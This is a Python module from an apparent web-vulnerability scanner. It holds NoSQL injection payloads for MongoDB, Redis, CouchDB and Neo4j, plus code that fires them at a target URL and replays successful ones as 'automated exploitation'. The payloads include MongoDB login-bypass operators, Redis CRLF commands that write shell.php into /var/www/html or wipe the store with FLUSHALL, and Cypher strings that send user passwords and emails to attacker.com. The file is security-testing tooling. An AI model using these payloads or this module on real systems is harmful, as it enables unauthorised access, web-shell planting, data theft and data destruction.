"""
NoSQL Injection Module

Provides SQL-style injection payloads and detection logic for NoSQL databases:
MongoDB, Redis, CouchDB, and Neo4j (Cypher).
"""

import json
import logging
import re
from typing import Any, Dict, List, Optional, Tuple

import requests

from .injection_contexts.base import (
    InjectionAttackModule,
    InjectionContextType,
)

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# MongoDB payloads
# ---------------------------------------------------------------------------

MONGODB_OPERATOR_PAYLOADS: List[Dict[str, Any]] = [
    # Auth bypass
    {"username": {"$ne": None}, "password": {"$ne": None}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$gte": ""}, "password": {"$gte": ""}},
    # Regex bypass
    {"username": {"$regex": ".*"}},
    {"username": {"$regex": "^adm"}},
    # JavaScript injection
    {"$where": "function() { return true; }"},
    {"$where": "this.username == this.username"},
    # Data extraction
    {"username": {"$exists": True}},
    {"$or": [{"username": "admin"}, {"username": {"$ne": "x"}}]},
]

MONGODB_STRING_PAYLOADS: List[str] = [
    # URL-encoded operator injection
    "username[$ne]=null&password[$ne]=null",
    "username[$gt]=&password[$gt]=",
    "username[$regex]=.*&password[$regex]=.*",
    "username[$exists]=true",
    # JSON-body operator injection
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"$where": "function() { return true; }"}',
    '{"username": {"$regex": ".*"}}',
    # NoSQLi via array syntax
    "username[]=admin&username[]=x&password[]=test",
]

MONGODB_AGGREGATION_PAYLOADS: List[str] = [
    '[{"$match": {"$where": "function() { return true; }"}}, {"$project": {"password": 1}}]',
    '[{"$lookup": {"from": "users", "localField": "id", "foreignField": "_id", "as": "data"}}]',
]


# ---------------------------------------------------------------------------
# Redis payloads
# ---------------------------------------------------------------------------

REDIS_COMMAND_INJECTION: List[str] = [
    # CRLF injection to inject Redis commands
    "\r\nSET mykey malicious\r\n",
    "\r\nCONFIG SET dir /var/www/html\r\n",
    "\r\nCONFIG SET dbfilename shell.php\r\n",
    "\r\nSAVE\r\n",
    "\r\nFLUSHALL\r\n",
    "\r\nKEYS *\r\n",
    "\r\nINFO server\r\n",
    # Newline injection variants
    "%0d%0aSET mykey malicious%0d%0a",
    "%0d%0aCONFIG SET dir /var/www/html%0d%0a",
    # Lua scripting injection
    "\r\nEVAL \"return redis.call('INFO','server')\" 0\r\n",
]


# ---------------------------------------------------------------------------
# CouchDB payloads
# ---------------------------------------------------------------------------

COUCHDB_PAYLOADS: List[Dict[str, Any]] = [
    # Selector injection
    {"selector": {"_id": {"$gte": None}}},
    {"selector": {"password": {"$regex": ".*"}}},
    {"selector": {"$or": [{"_id": "admin"}, {"_id": {"$ne": "x"}}]}},
    # Mango query injection
    {"selector": {"type": "user", "password": {"$exists": True}}},
    {"selector": {"$where": "function() { return true; }"}},
]

COUCHDB_STRING_PAYLOADS: List[str] = [
    '{"selector": {"_id": {"$gte": null}}}',
    '{"selector": {"password": {"$regex": ".*"}}}',
    '{"selector": {"$or": [{"_id": "admin"}, {"_id": {"$ne": "x"}}]}}',
]


# ---------------------------------------------------------------------------
# Neo4j Cypher injection payloads
# ---------------------------------------------------------------------------

NEO4J_CYPHER_PAYLOADS: List[str] = [
    # Auth bypass
    "' OR 1=1 WITH 1 as a MATCH (n) RETURN n//",
    "' OR '1'='1",
    "x' OR 'x'='x",
    # Data extraction
    "' UNION MATCH (u:User) RETURN u.password//",
    "' UNION MATCH (n) RETURN n.password LIMIT 10//",
    "' UNION MATCH (u:User) RETURN u.username, u.password//",
    # Blind detection
    "' AND 1=1//",
    "' AND 1=2//",
    # APOC-based OOB
    "' CALL apoc.load.json('http://attacker.com/exfil?data='+u.password)//",
    "' CALL apoc.http.get('http://attacker.com/?data='+u.email)//",
    # Relationship traversal
    "' MATCH (a:User)-[:ADMIN]->(b) RETURN b.password//",
    "' OPTIONAL MATCH (n) WHERE n.password IS NOT NULL RETURN n.password//",
]


# ---------------------------------------------------------------------------
# Detection patterns
# ---------------------------------------------------------------------------

NOSQL_ERROR_PATTERNS: List[Dict[str, Any]] = [
    # MongoDB
    {"pattern": r"MongoError", "type": "mongodb_error", "confidence": 0.95},
    {"pattern": r"MongoServerError", "type": "mongodb_error", "confidence": 0.95},
    {"pattern": r"$where.*javascript", "type": "mongodb_error", "confidence": 0.85},
    {"pattern": r"BSON field.*unknown", "type": "mongodb_error", "confidence": 0.90},
    {"pattern": r"unknown operator.*\$", "type": "mongodb_error", "confidence": 0.90},
    # Redis
    {"pattern": r"ERR.*command", "type": "redis_error", "confidence": 0.85},
    {"pattern": r"WRONGTYPE.*operation", "type": "redis_error", "confidence": 0.90},
    {"pattern": r"\-ERR", "type": "redis_error", "confidence": 0.80},
    # CouchDB
    {"pattern": r"\"error\"\s*:\s*\"bad_request\"", "type": "couchdb_error", "confidence": 0.90},
    {"pattern": r"mango.*query", "type": "couchdb_error", "confidence": 0.75},
    # Neo4j
    {"pattern": r"SyntaxError.*Cypher", "type": "neo4j_error", "confidence": 0.95},
    {"pattern": r"Neo\.ClientError", "type": "neo4j_error", "confidence": 0.95},
    {"pattern": r"Invalid.*Cypher", "type": "neo4j_error", "confidence": 0.90},
    # Generic
    {"pattern": r"unexpected.*operator", "type": "nosql_error", "confidence": 0.75},
    {"pattern": r"operator.*not.*supported", "type": "nosql_error", "confidence": 0.75},
]


# ---------------------------------------------------------------------------
# NoSQLInjector class
# ---------------------------------------------------------------------------

class NoSQLInjector:
    """
    Detects and tests NoSQL injection vulnerabilities across MongoDB, Redis,
    CouchDB, and Neo4j.
    """

    def __init__(self, config: Optional[Dict[str, Any]] = None) -> None:
        self.config = config or {}
        self.detection_patterns = NOSQL_ERROR_PATTERNS

    # ------------------------------------------------------------------
    # Database identification
    # ------------------------------------------------------------------

    def identify_nosql_backend(
        self, response_body: str, response_headers: Dict[str, str]
    ) -> str:
        """
        Attempt to identify the NoSQL backend from response artefacts.

        Returns:
            One of: 'mongodb', 'redis', 'couchdb', 'neo4j', 'unknown'.
        """
        combined = response_body + " " + " ".join(response_headers.values())

        if re.search(r"mongo|bson|\$where", combined, re.IGNORECASE):
            return "mongodb"
        if re.search(r"redis|-ERR|WRONGTYPE", combined, re.IGNORECASE):
            return "redis"
        if re.search(r"couchdb|mango|_design|_view", combined, re.IGNORECASE):
            return "couchdb"
        if re.search(r"neo4j|cypher|bolt://", combined, re.IGNORECASE):
            return "neo4j"
        return "unknown"

    # ------------------------------------------------------------------
    # Payload retrieval
    # ------------------------------------------------------------------

    def get_payloads_for_backend(self, backend: str) -> List[Any]:
        """Return payloads appropriate for the given NoSQL backend."""
        mapping: Dict[str, List[Any]] = {
            "mongodb": MONGODB_STRING_PAYLOADS + [json.dumps(p) for p in MONGODB_OPERATOR_PAYLOADS],
            "redis": REDIS_COMMAND_INJECTION,
            "couchdb": COUCHDB_STRING_PAYLOADS,
            "neo4j": NEO4J_CYPHER_PAYLOADS,
        }
        return mapping.get(backend, MONGODB_STRING_PAYLOADS)

    def get_all_payloads(self) -> List[str]:
        """Return all NoSQL payloads as strings."""
        all_payloads: List[str] = []
        all_payloads.extend(MONGODB_STRING_PAYLOADS)
        all_payloads.extend(REDIS_COMMAND_INJECTION)
        all_payloads.extend(COUCHDB_STRING_PAYLOADS)
        all_payloads.extend(NEO4J_CYPHER_PAYLOADS)
        return all_payloads

    # ------------------------------------------------------------------
    # Detection
    # ------------------------------------------------------------------

    def detect_anomalies(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_response: Optional[Tuple[str, float]] = None,
    ) -> Tuple[bool, List[str]]:
        """
        Scan a response for NoSQL injection indicators.

        Returns:
            (anomaly_detected, list_of_anomaly_descriptions)
        """
        anomalies: List[str] = []

        for pattern_info in self.detection_patterns:
            if re.search(pattern_info["pattern"], response_body, re.IGNORECASE):
                anomalies.append(f"{pattern_info['type']}: {pattern_info['pattern']}")

        # Timing
        if baseline_response:
            _, baseline_time = baseline_response
            if response_time > baseline_time + 4.5:
                anomalies.append(
                    f"time_based: Response delayed by {response_time - baseline_time:.2f}s"
                )

        # Content change
        if baseline_response:
            baseline_body, _ = baseline_response
            diff = abs(len(response_body) - len(baseline_body))
            if diff > 200:
                anomalies.append(f"content_change: Response size changed by {diff} bytes")

        return len(anomalies) > 0, anomalies

    def extract_evidence(
        self, response_body: str, anomalies: List[str]
    ) -> Dict[str, Any]:
        """Extract evidence and confidence from anomalies."""
        evidence: Dict[str, Any] = {
            "error_type": "nosql_injection",
            "details": {"anomalies": anomalies},
            "context_info": {},
            "confidence": 0.0,
        }

        for anomaly in anomalies:
            if "mongodb_error" in anomaly or "couchdb_error" in anomaly or "neo4j_error" in anomaly:
                evidence["confidence"] = max(evidence["confidence"], 0.90)
                evidence["context_info"]["db_type"] = anomaly.split("_")[0]
            elif "redis_error" in anomaly:
                evidence["confidence"] = max(evidence["confidence"], 0.85)
                evidence["context_info"]["db_type"] = "redis"
            elif "nosql_error" in anomaly:
                evidence["confidence"] = max(evidence["confidence"], 0.70)
            elif "time_based" in anomaly:
                evidence["confidence"] = max(evidence["confidence"], 0.65)

        return evidence

    # ------------------------------------------------------------------
    # Scan helper
    # ------------------------------------------------------------------

    def scan(
        self,
        target_url: str,
        parameter_name: str = "username",
        parameter_type: str = "POST_JSON",
        backend_hint: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """
        Run a NoSQL injection scan against a target endpoint.

        Args:
            target_url: Target URL.
            parameter_name: Parameter to inject into.
            parameter_type: How to send the parameter (POST_JSON | GET | POST_FORM).
            backend_hint: Optional backend type to focus payloads.

        Returns:
            List of finding dicts for each successful injection.
        """
        # Baseline
        baseline_body = ""
        baseline_time = 0.0
        try:
            import time as _time

            t0 = _time.time()
            r = requests.get(target_url, timeout=self.config.get("timeout", 10))
            baseline_time = _time.time() - t0
            baseline_body = r.text
        except Exception:
            pass

        backend = backend_hint or "mongodb"
        payloads = self.get_payloads_for_backend(backend)
        findings: List[Dict[str, Any]] = []

        import time as _time

        for payload in payloads[:15]:  # Limit for speed
            try:
                t0 = _time.time()

                if parameter_type == "POST_JSON":
                    # Try to parse as JSON dict or wrap as string value
                    try:
                        body = json.loads(payload)
                        if not isinstance(body, dict):
                            body = {parameter_name: payload}
                    except Exception:
                        body = {parameter_name: payload}
                    resp = requests.post(
                        target_url,
                        json=body,
                        timeout=self.config.get("timeout", 10),
                    )
                elif parameter_type == "POST_FORM":
                    resp = requests.post(
                        target_url,
                        data={parameter_name: payload},
                        timeout=self.config.get("timeout", 10),
                    )
                else:  # GET
                    resp = requests.get(
                        target_url,
                        params={parameter_name: payload},
                        timeout=self.config.get("timeout", 10),
                    )

                elapsed = _time.time() - t0
                detected, anomalies = self.detect_anomalies(
                    resp.text, dict(resp.headers), elapsed, (baseline_body, baseline_time)
                )

                if detected:
                    evidence = self.extract_evidence(resp.text, anomalies)
                    findings.append(
                        {
                            "payload": payload,
                            "backend": backend,
                            "anomalies": anomalies,
                            "confidence": evidence["confidence"],
                            "response_snippet": resp.text[:500],
                            "parameter": parameter_name,
                            "parameter_type": parameter_type,
                        }
                    )
            except Exception as exc:
                logger.debug("NoSQL injection test failed: %s", exc)

        return findings



# ---------------------------------------------------------------------------
# InjectionAttackModule-compatible context class
# ---------------------------------------------------------------------------

class NoSQLInjectionContext(InjectionAttackModule):
    """
    NoSQL injection context that implements the InjectionAttackModule interface
    so it can be registered with the MultiContextAttackOrchestrator.

    Internally delegates to the NoSQLInjector for detection logic.
    """

    def __init__(self, config: Optional[Dict[str, Any]] = None) -> None:
        self._injector = NoSQLInjector(config)
        super().__init__(config)

    def get_context_type(self) -> InjectionContextType:
        return InjectionContextType.NOSQL

    def _load_payloads(self) -> List[str]:
        return self._injector.get_all_payloads()

    def _load_detection_patterns(self) -> List[Dict[str, Any]]:
        return NOSQL_ERROR_PATTERNS

    def step1_supply_payloads(self, parameter_value: str) -> List[str]:
        return self.payloads

    def step2_detect_anomalies(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_response: Optional[Tuple[str, float]] = None,
    ) -> Tuple[bool, List[str]]:
        return self._injector.detect_anomalies(
            response_body, response_headers, response_time, baseline_response
        )

    def step3_extract_evidence(
        self, response_body: str, anomalies: List[str]
    ) -> Dict[str, Any]:
        return self._injector.extract_evidence(response_body, anomalies)

    def step4_mutate_and_verify(
        self,
        target_url: str,
        parameter_name: str,
        parameter_type: str,
        parameter_value: str,
        successful_payload: str,
        http_method: str = "POST",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> Tuple[bool, float, str]:
        """Verify by sending a benign variant and comparing responses."""
        safe_payload = "{}"
        try:
            r1 = requests.post(
                target_url,
                json={parameter_name: successful_payload},
                headers=headers,
                cookies=cookies,
                timeout=self.config.get("timeout", 10),
            )
            r2 = requests.post(
                target_url,
                json={parameter_name: safe_payload},
                headers=headers,
                cookies=cookies,
                timeout=self.config.get("timeout", 10),
            )
            confirmed = r1.text != r2.text
            confidence = 0.80 if confirmed else 0.50
            return confirmed, confidence, f"true_len={len(r1.text)}, false_len={len(r2.text)}"
        except Exception as exc:
            return False, 0.0, str(exc)

    def step5_build_poc(
        self,
        vulnerable_parameter: str,
        successful_payload: str,
        evidence: Dict[str, Any],
    ) -> Dict[str, Any]:
        return {
            "poc_payload": successful_payload,
            "expected_result": "NoSQL error or boolean difference in response",
            "safety_notes": "Read-only NoSQL injection proof-of-concept",
            "reproduction_steps": [
                f"1. Send POST JSON with '{vulnerable_parameter}': {successful_payload}",
                "2. Observe response for NoSQL error messages or data differences",
            ],
        }

    def step6_automated_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        poc_payload: str,
        evidence: Dict[str, Any],
        http_method: str = "POST",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> Optional[Dict[str, Any]]:
        try:
            resp = requests.post(
                target_url,
                json={vulnerable_parameter: poc_payload},
                headers=headers,
                cookies=cookies,
                timeout=self.config.get("timeout", 10),
            )
            return {
                "success": True,
                "data_extracted": {"raw_response": resp.text[:2000]},
                "impact_level": "high",
                "remediation": [
                    "Validate input types before passing to NoSQL queries.",
                    "Use an ODM/ORM that sanitises operator injection.",
                    "Block $ and dot operators in user-supplied JSON keys.",
                ],
            }
        except Exception as exc:
            return {
                "success": False,
                "data_extracted": {},
                "impact_level": "unknown",
                "remediation": [],
                "error": str(exc),
            }

    def analyze_response(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_time: Optional[float] = None,
    ) -> Tuple[bool, float, str]:
        baseline = ("", baseline_time) if baseline_time else None
        detected, anomalies = self.step2_detect_anomalies(
            response_body, response_headers, response_time, baseline
        )
        if not detected:
            return False, 0.0, "No NoSQL injection detected"
        evidence = self.step3_extract_evidence(response_body, anomalies)
        return (
            True,
            evidence["confidence"],
            f"NoSQL injection detected: {', '.join(anomalies[:3])}",
        )

    def attempt_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        successful_payload: str,
    ) -> Optional[Dict[str, Any]]:
        evidence: Dict[str, Any] = {}
        poc = self.step5_build_poc(vulnerable_parameter, successful_payload, evidence)
        return self.step6_automated_exploitation(
            target_url, vulnerable_parameter, parameter_type, poc["poc_payload"], evidence
        )
